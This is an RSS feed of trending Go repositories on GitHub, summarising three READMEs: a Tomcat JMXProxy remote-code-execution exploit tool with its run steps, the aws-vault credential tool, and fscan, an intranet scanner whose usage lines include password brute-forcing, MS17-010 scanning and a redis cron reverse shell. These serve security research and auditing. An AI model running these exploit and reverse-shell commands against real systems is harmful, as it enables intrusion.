<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-16T01:41:18Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>4ra1n/tomcat-jmxproxy-rce-exp</title>
    <updated>2022-06-16T01:41:18Z</updated>
    <id>tag:github.com,2022-06-16:/4ra1n/tomcat-jmxproxy-rce-exp</id>
    <link href="https://github.com/4ra1n/tomcat-jmxproxy-rce-exp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Apache Tomcat JMXProxy RCE&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;tomcat-jmxproxy-rce-exp&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;The tool is only used for security research. It is prohibited to use the tool to launch illegal attacks, and the user is responsible for the consequences&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;工具仅用于安全研究以及内部自查，禁止使用工具发起非法攻击，造成的后果使用者负责&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;About&lt;/h2&gt; &#xA;&lt;p&gt;Introduce: Apache Tomcat JMXProxy RCE&lt;/p&gt; &#xA;&lt;p&gt;I reported this to &lt;strong&gt;Apache Tomcat&lt;/strong&gt; as soon as I found the vulnerability, But &lt;strong&gt;Apache Tomcat Security Team&lt;/strong&gt; does not consider this a security vulnerability, so it is open.&lt;/p&gt; &#xA;&lt;p&gt;I understand that this is not a security issue for which &lt;strong&gt;Tomcat&lt;/strong&gt; is responsible, but there are high security risks.&lt;/p&gt; &#xA;&lt;p&gt;The vulnerability is based on &lt;code&gt;JMXProxyServlet&lt;/code&gt; in &lt;code&gt;Tomcat&lt;/code&gt; and similar to &lt;strong&gt;Spring4Shell&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;JMXProxyServlet&lt;/code&gt; in &lt;code&gt;Tomcat&lt;/code&gt; provides JMX monitoring related functions. However, basic authentication is required to access it, so it is difficult to exploit it in general.&lt;/p&gt; &#xA;&lt;p&gt;Vulnerability is difficult to exploit directly and require high preconditions, but the third-party JMX management platform can bypass basic authentication, then RCE easily. If the JMX management platform can be accessed anonymously or has an unauthorized access vulnerability, it can be bypassed.&lt;/p&gt; &#xA;&lt;p&gt;Affected:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Apache Tomcat All Versions&lt;/li&gt; &#xA; &lt;li&gt;with JDK All Versions&lt;/li&gt; &#xA; &lt;li&gt;SpringBoot FarJar is not affected&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/4ra1n/tomcat-jmxproxy-rce-exp/master/img/attack.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Exploit Condition 1&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;target must open jmxproxy manager&lt;/li&gt; &#xA; &lt;li&gt;hacker can access jmxproxy&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Exploit Condition 2&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;target must have JMX management platform (&lt;code&gt;MX4J&lt;/code&gt; or others)&lt;/li&gt; &#xA; &lt;li&gt;hacker can access the platform&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Exploit Condition 3&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;target must open jmxproxy&lt;/li&gt; &#xA; &lt;li&gt;based on csrf vulnerability&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Exploit-1&lt;/h2&gt; &#xA;&lt;p&gt;edit: &lt;code&gt;conf/tomcat-user.xml&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;user username=&#34;admin&#34; password=&#34;123456&#34; roles=&#34;manager-jmx&#34;/&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;modify &lt;code&gt;config.ini&lt;/code&gt; file&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# target ip&#xA;host=127.0.0.1&#xA;# target port&#xA;port=8080&#xA;# target tomcat jmxproxy username&#xA;username=admin&#xA;# target tomcat jmxproxy password&#xA;password=123456&#xA;# execute command&#xA;cmd=calc.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;exploit: &lt;code&gt;./tomcat-jmxproxy-rce-exp&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/4ra1n/tomcat-jmxproxy-rce-exp/master/img/rce.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Exploit-2&lt;/h2&gt; &#xA;&lt;p&gt;If the JMX Management Platform (&lt;code&gt;MX4J&lt;/code&gt; and others) can be accessed without authorization, directly modify &lt;code&gt;AccessLogValve&lt;/code&gt; MBean attributes to perform RCE attack&lt;/p&gt; &#xA;&lt;h2&gt;Exploit-3&lt;/h2&gt; &#xA;&lt;p&gt;CSRF+RCE / XSS+CSRF+RCE&lt;/p&gt; &#xA;&lt;p&gt;In Apache Tomcat Document:&lt;/p&gt; &#xA;&lt;p&gt;&#34;The HTML interface is protected against CSRF (Cross-Site Request Forgery) attacks, but the text and JMX interfaces cannot be protected.&#34;&lt;/p&gt; &#xA;&lt;p&gt;So we can exploit with CSRF / XSS+CSRF&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>99designs/aws-vault</title>
    <updated>2022-06-16T01:41:18Z</updated>
    <id>tag:github.com,2022-06-16:/99designs/aws-vault</id>
    <link href="https://github.com/99designs/aws-vault" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A vault for securely storing and accessing AWS credentials in development environments&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;AWS Vault&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/99designs/aws-vault/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/downloads/99designs/aws-vault/total.svg?sanitize=true&#34; alt=&#34;Downloads&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/99designs/aws-vault/actions&#34;&gt;&lt;img src=&#34;https://github.com/99designs/aws-vault/workflows/Continuous%20Integration/badge.svg?sanitize=true&#34; alt=&#34;Continuous Integration&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;AWS Vault is a tool to securely store and access AWS credentials in a development environment.&lt;/p&gt; &#xA;&lt;p&gt;AWS Vault stores IAM credentials in your operating system&#39;s secure keystore and then generates temporary credentials from those to expose to your shell and applications. It&#39;s designed to be complementary to the AWS CLI tools, and is aware of your &lt;a href=&#34;https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html#cli-config-files&#34;&gt;profiles and configuration in &lt;code&gt;~/.aws/config&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Check out the &lt;a href=&#34;https://99designs.com.au/tech-blog/blog/2015/10/26/aws-vault/&#34;&gt;announcement blog post&lt;/a&gt; for more details.&lt;/p&gt; &#xA;&lt;h2&gt;Installing&lt;/h2&gt; &#xA;&lt;p&gt;You can install AWS Vault:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;by downloading the &lt;a href=&#34;https://github.com/99designs/aws-vault/releases/latest&#34;&gt;latest release&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;on macOS with &lt;a href=&#34;https://formulae.brew.sh/cask/aws-vault&#34;&gt;Homebrew Cask&lt;/a&gt;: &lt;code&gt;brew install --cask aws-vault&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;on macOS with &lt;a href=&#34;https://ports.macports.org/port/aws-vault/summary&#34;&gt;MacPorts&lt;/a&gt;: &lt;code&gt;port install aws-vault&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;on Windows with &lt;a href=&#34;https://chocolatey.org/packages/aws-vault&#34;&gt;Chocolatey&lt;/a&gt;: &lt;code&gt;choco install aws-vault&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;on Windows with &lt;a href=&#34;https://scoop.sh/&#34;&gt;Scoop&lt;/a&gt;: &lt;code&gt;scoop install aws-vault&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;on Linux with &lt;a href=&#34;https://formulae.brew.sh/formula/aws-vault&#34;&gt;Homebrew on Linux&lt;/a&gt;: &lt;code&gt;brew install aws-vault&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;on &lt;a href=&#34;https://www.archlinux.org/packages/community/x86_64/aws-vault/&#34;&gt;Arch Linux&lt;/a&gt;: &lt;code&gt;pacman -S aws-vault&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;on &lt;a href=&#34;https://github.com/gentoo/guru/tree/master/app-admin/aws-vault&#34;&gt;Gentoo Linux&lt;/a&gt;: &lt;code&gt;emerge --ask app-admin/aws-vault&lt;/code&gt; (&lt;a href=&#34;https://wiki.gentoo.org/wiki/Project:GURU/Information_for_End_Users&#34;&gt;enable Guru first&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;on &lt;a href=&#34;https://www.freshports.org/security/aws-vault/&#34;&gt;FreeBSD&lt;/a&gt;: &lt;code&gt;pkg install aws-vault&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;on &lt;a href=&#34;https://software.opensuse.org/package/aws-vault&#34;&gt;OpenSUSE&lt;/a&gt;: enable devel:languages:go repo then &lt;code&gt;zypper install aws-vault&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;with &lt;a href=&#34;https://search.nixos.org/packages?show=aws-vault&amp;amp;query=aws-vault&#34;&gt;Nix&lt;/a&gt;: &lt;code&gt;nix-env -i aws-vault&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;with &lt;a href=&#34;https://github.com/karancode/asdf-aws-vault&#34;&gt;asdf-vm&lt;/a&gt;: &lt;code&gt;asdf plugin-add aws-vault https://github.com/karancode/asdf-aws-vault.git &amp;amp;&amp;amp; asdf install aws-vault &amp;lt;version&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;Config, usage, tips and tricks are available in the &lt;a href=&#34;https://raw.githubusercontent.com/99designs/aws-vault/master/USAGE.md&#34;&gt;USAGE.md&lt;/a&gt; file.&lt;/p&gt; &#xA;&lt;h2&gt;Vaulting Backends&lt;/h2&gt; &#xA;&lt;p&gt;The supported vaulting backends are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://support.apple.com/en-au/guide/keychain-access/welcome/mac&#34;&gt;macOS Keychain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://support.microsoft.com/en-au/help/4026814/windows-accessing-credential-manager&#34;&gt;Windows Credential Manager&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Secret Service (&lt;a href=&#34;https://wiki.gnome.org/Projects/GnomeKeyring&#34;&gt;Gnome Keyring&lt;/a&gt;, &lt;a href=&#34;https://kde.org/applications/system/org.kde.kwalletmanager5&#34;&gt;KWallet&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://kde.org/applications/system/org.kde.kwalletmanager5&#34;&gt;KWallet&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.passwordstore.org/&#34;&gt;Pass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Encrypted file&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Use the &lt;code&gt;--backend&lt;/code&gt; flag or &lt;code&gt;AWS_VAULT_BACKEND&lt;/code&gt; environment variable to specify.&lt;/p&gt; &#xA;&lt;h2&gt;Quick start&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# Store AWS credentials for the &#34;jonsmith&#34; profile&#xA;$ aws-vault add jonsmith&#xA;Enter Access Key Id: ABDCDEFDASDASF&#xA;Enter Secret Key: %%%&#xA;&#xA;# Execute a command (using temporary credentials)&#xA;$ aws-vault exec jonsmith -- aws s3 ls&#xA;bucket_1&#xA;bucket_2&#xA;&#xA;# open a browser window and login to the AWS Console&#xA;$ aws-vault login jonsmith&#xA;&#xA;# List credentials&#xA;$ aws-vault list&#xA;Profile                  Credentials              Sessions&#xA;=======                  ===========              ========&#xA;jonsmith                 jonsmith                 -&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;How it works&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;aws-vault&lt;/code&gt; uses Amazon&#39;s STS service to generate &lt;a href=&#34;https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html&#34;&gt;temporary credentials&lt;/a&gt; via the &lt;code&gt;GetSessionToken&lt;/code&gt; or &lt;code&gt;AssumeRole&lt;/code&gt; API calls. These expire in a short period of time, so the risk of leaking credentials is reduced.&lt;/p&gt; &#xA;&lt;p&gt;AWS Vault then exposes the temporary credentials to the sub-process in one of two ways&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;strong&gt;Environment variables&lt;/strong&gt; are written to the sub-process. Notice in the below example how the AWS credentials get written out &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ aws-vault exec jonsmith -- env | grep AWS&#xA;AWS_VAULT=jonsmith&#xA;AWS_DEFAULT_REGION=us-east-1&#xA;AWS_REGION=us-east-1&#xA;AWS_ACCESS_KEY_ID=%%%&#xA;AWS_SECRET_ACCESS_KEY=%%%&#xA;AWS_SESSION_TOKEN=%%%&#xA;AWS_SECURITY_TOKEN=%%%&#xA;AWS_SESSION_EXPIRATION=2020-04-16T11:16:27Z&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Local &lt;a href=&#34;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html&#34;&gt;EC2 Instance Metadata server&lt;/a&gt;&lt;/strong&gt; is started. This approach has the advantage that anything that uses Amazon&#39;s SDKs will automatically refresh credentials as needed, so session times can be as short as possible. The downside is that only one can run per host and because it binds to &lt;code&gt;169.254.169.254:80&lt;/code&gt;, your sudo password is required.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;The default is to use environment variables, but you can opt-in to the local instance metadata server with the &lt;code&gt;--server&lt;/code&gt; flag on the &lt;code&gt;exec&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;h2&gt;Roles and MFA&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#delegate-using-roles&#34;&gt;Best-practice&lt;/a&gt; is to &lt;a href=&#34;https://docs.aws.amazon.com/cli/latest/userguide/cli-roles.html&#34;&gt;create Roles to delegate permissions&lt;/a&gt;. For security, you should also require that users provide a one-time key generated from a multi-factor authentication (MFA) device.&lt;/p&gt; &#xA;&lt;p&gt;First you&#39;ll need to create the users and roles in IAM, as well as &lt;a href=&#34;https://docs.aws.amazon.com/IAM/latest/UserGuide/GenerateMFAConfigAccount.html&#34;&gt;setup an MFA device&lt;/a&gt;. You can then &lt;a href=&#34;https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-mfa&#34;&gt;set up IAM roles to enforce MFA&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Here&#39;s an example configuration using roles and MFA:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;[default]&#xA;region = us-east-1&#xA;&#xA;[profile jonsmith]&#xA;mfa_serial = arn:aws:iam::111111111111:mfa/jonsmith&#xA;&#xA;[profile foo-readonly]&#xA;source_profile = jonsmith&#xA;role_arn = arn:aws:iam::22222222222:role/ReadOnly&#xA;&#xA;[profile foo-admin]&#xA;source_profile = jonsmith&#xA;role_arn = arn:aws:iam::22222222222:role/Administrator&#xA;mfa_serial = arn:aws:iam::111111111111:mfa/jonsmith&#xA;&#xA;[profile bar-role1]&#xA;source_profile = jonsmith&#xA;role_arn = arn:aws:iam::333333333333:role/Role1&#xA;mfa_serial = arn:aws:iam::111111111111:mfa/jonsmith&#xA;&#xA;[profile bar-role2]&#xA;source_profile = bar-role1&#xA;role_arn = arn:aws:iam::333333333333:role/Role2&#xA;mfa_serial = arn:aws:iam::111111111111:mfa/jonsmith&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here&#39;s what you can expect from aws-vault&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Command&lt;/th&gt; &#xA;   &lt;th&gt;Credentials&lt;/th&gt; &#xA;   &lt;th&gt;Cached&lt;/th&gt; &#xA;   &lt;th&gt;MFA&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;aws-vault exec jonsmith --no-session&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Long-term credentials&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;aws-vault exec jonsmith&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;session-token&lt;/td&gt; &#xA;   &lt;td&gt;session-token&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;aws-vault exec foo-readonly&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;role&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;aws-vault exec foo-admin&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;session-token + role&lt;/td&gt; &#xA;   &lt;td&gt;session-token&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;aws-vault exec foo-admin --duration=2h&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;role&lt;/td&gt; &#xA;   &lt;td&gt;role&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;aws-vault exec bar-role2&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;session-token + role + role&lt;/td&gt; &#xA;   &lt;td&gt;session-token&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;aws-vault exec bar-role2 --no-session&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;role + role&lt;/td&gt; &#xA;   &lt;td&gt;role&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Development&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://github.com/99designs/aws-vault/releases&#34;&gt;macOS release builds&lt;/a&gt; are code-signed to avoid extra prompts in Keychain. You can verify this with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ codesign --verify --verbose $(which aws-vault)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you are developing or compiling the aws-vault binary yourself, you can &lt;a href=&#34;https://support.apple.com/en-au/guide/keychain-access/kyca8916/mac&#34;&gt;generate a self-signed certificate&lt;/a&gt; by accessing Keychain Access &amp;gt; Certificate Assistant &amp;gt; Create Certificate -&amp;gt; Certificate Type: Code Signing. You can then sign your binary with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ go build .&#xA;$ codesign --sign &amp;lt;Name of certificate created above&amp;gt; ./aws-vault&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;References and Inspiration&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/pda/aws-keychain&#34;&gt;https://github.com/pda/aws-keychain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.aws.amazon.com/IAM/latest/UserGuide/MFAProtectedAPI.html&#34;&gt;https://docs.aws.amazon.com/IAM/latest/UserGuide/MFAProtectedAPI.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.aws.amazon.com/IAM/latest/UserGuide/IAMBestPractices.html#create-iam-users&#34;&gt;https://docs.aws.amazon.com/IAM/latest/UserGuide/IAMBestPractices.html#create-iam-users&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/makethunder/awsudo&#34;&gt;https://github.com/makethunder/awsudo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/AdRoll/hologram&#34;&gt;https://github.com/AdRoll/hologram&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/realestate-com-au/credulous&#34;&gt;https://github.com/realestate-com-au/credulous&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dump247/aws-mock-metadata&#34;&gt;https://github.com/dump247/aws-mock-metadata&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://boto.readthedocs.org/en/latest/boto_config_tut.html&#34;&gt;https://boto.readthedocs.org/en/latest/boto_config_tut.html&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>shadow1ng/fscan</title>
    <updated>2022-06-16T01:41:18Z</updated>
    <id>tag:github.com,2022-06-16:/shadow1ng/fscan</id>
    <link href="https://github.com/shadow1ng/fscan" rel="alternate"></link>
    <summary type="html">&lt;p&gt;一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;fscan&lt;/h1&gt; &#xA;&lt;h1&gt;简介&lt;/h1&gt; &#xA;&lt;p&gt;一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。&lt;br&gt; 支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。&lt;/p&gt; &#xA;&lt;h2&gt;主要功能&lt;/h2&gt; &#xA;&lt;p&gt;1.信息搜集:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;存活探测(icmp)&lt;/li&gt; &#xA; &lt;li&gt;端口扫描&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;2.爆破功能:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;各类服务爆破(ssh、smb、rdp等)&lt;/li&gt; &#xA; &lt;li&gt;数据库密码爆破(mysql、mssql、redis、psql、oracle等)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;3.系统信息、漏洞扫描:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;netbios探测、域控识别&lt;/li&gt; &#xA; &lt;li&gt;获取目标网卡信息&lt;/li&gt; &#xA; &lt;li&gt;高危漏洞扫描(ms17010等)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;4.Web探测功能:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;webtitle探测&lt;/li&gt; &#xA; &lt;li&gt;web指纹识别(常见cms、oa框架等)&lt;/li&gt; &#xA; &lt;li&gt;web漏洞扫描(weblogic、st2等,支持xray的poc)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;5.漏洞利用:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;redis写公钥或写计划任务&lt;/li&gt; &#xA; &lt;li&gt;ssh命令执行&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;6.其他功能:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;文件保存&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;usege&lt;/h2&gt; &#xA;&lt;p&gt;简单用法&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;fscan.exe -h 192.168.1.1/24  (默认使用全部模块)&#xA;fscan.exe -h 192.168.1.1/16  (B段扫描)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;其他用法&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)&#xA;fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)&#xA;fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)&#xA;fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)&#xA;fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)&#xA;fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)&#xA;fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) &#xA;fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )&#xA;fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)&#xA;fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)&#xA;fscan.exe -hf ip.txt  (以文件导入)&#xA;fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)&#xA;fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)&#xA;fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389-&amp;gt;rdp扫描)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;编译命令&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;go build -ldflags=&#34;-s -w &#34; -trimpath&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;完整参数&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  -c string&#xA;        ssh命令执行&#xA;  -cookie string&#xA;        设置cookie&#xA;  -debug int&#xA;        多久没响应,就打印当前进度(default 60)&#xA;  -domain string&#xA;        smb爆破模块时,设置域名&#xA;  -h string&#xA;        目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12&#xA;  -hf string&#xA;        读取文件中的目标&#xA;  -hn string&#xA;        扫描时,要跳过的ip: -hn 192.168.1.1/24&#xA;  -m string&#xA;        设置扫描模式: -m ssh (default &#34;all&#34;)&#xA;  -no&#xA;        扫描结果不保存到文件中&#xA;  -nobr&#xA;        跳过sql、ftp、ssh等的密码爆破&#xA;  -nopoc&#xA;        跳过web poc扫描&#xA;  -np&#xA;        跳过存活探测&#xA;  -num int&#xA;        web poc 发包速率  (default 20)&#xA;  -o string&#xA;        扫描结果保存到哪 (default &#34;result.txt&#34;)&#xA;  -p string&#xA;        设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &#34;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&#34;)&#xA;  -pa string&#xA;        新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)&#xA;  -path string&#xA;        fcgi、smb romote file path&#xA;  -ping&#xA;        使用ping代替icmp进行存活探测&#xA;  -pn string&#xA;        扫描时要跳过的端口,as: -pn 445&#xA;  -pocname string&#xA;        指定web poc的模糊名字, -pocname weblogic&#xA;  -proxy string&#xA;        设置代理, -proxy http://127.0.0.1:8080&#xA;  -user string&#xA;        指定爆破时的用户名&#xA;  -userf string&#xA;        指定爆破时的用户名文件&#xA;  -pwd string&#xA;        指定爆破时的密码&#xA;  -pwdf string&#xA;        指定爆破时的密码文件&#xA;  -rf string&#xA;        指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)&#xA;  -rs string&#xA;        redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)&#xA;  -silent&#xA;        静默扫描,适合cs扫描时不回显&#xA;  -sshkey string&#xA;        ssh连接时,指定ssh私钥&#xA;  -t int&#xA;        扫描线程 (default 600)&#xA;  -time int&#xA;        端口扫描超时时间 (default 3)&#xA;  -u string&#xA;        指定Url扫描&#xA;  -uf string&#xA;        指定Url文件扫描&#xA;  -wt int&#xA;        web访问超时时间 